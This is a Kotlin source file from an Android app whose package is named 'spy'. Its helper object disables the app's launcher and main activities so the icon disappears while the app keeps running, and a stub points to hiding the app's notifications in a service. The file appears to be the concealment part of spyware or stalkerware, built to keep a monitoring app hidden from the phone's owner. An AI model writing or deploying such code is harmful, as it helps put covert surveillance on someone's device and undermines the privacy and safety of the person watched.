package com.gauravhanna.spy

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper

object HideAppHelper {

    fun hideAppIcon(context: Context) {
        try {
            // Disable launcher activity
            val componentName = ComponentName(context, "${context.packageName}.HiddenLauncherActivity")
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            // Also disable main activity
            val mainComponent = ComponentName(context, "${context.packageName}.MainActivity")
            context.packageManager.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun showAppIcon(context: Context) {
        try {
            val componentName = ComponentName(context, "${context.packageName}.HiddenLauncherActivity")
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun hideNotification(notificationId: Int) {
        // This will be handled in the service
    }
}